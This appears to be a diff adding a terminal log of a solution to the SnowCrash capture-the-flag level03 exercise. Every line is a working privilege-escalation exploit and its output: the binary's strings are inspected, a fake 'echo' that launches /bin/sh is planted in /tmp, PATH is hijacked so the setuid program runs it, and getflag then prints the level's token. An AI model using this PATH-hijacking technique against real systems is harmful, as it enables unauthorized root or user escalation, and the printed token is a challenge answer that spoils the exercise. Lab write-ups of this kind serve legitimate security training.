@@ -1,0 +1,10 @@
+level03@SnowCrash:~$ ./level03
+Exploit me
+level03@SnowCrash:~$ strings level03 | grep "/bin"
+/usr/bin/env echo Exploit me
+level03@SnowCrash:~$ echo '/bin/sh' > /tmp/echo
+level03@SnowCrash:~$ chmod +x /tmp/echo
+level03@SnowCrash:~$ export PATH=/tmp:$PATH
+level03@SnowCrash:~$ ./level03
+$ getflag
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
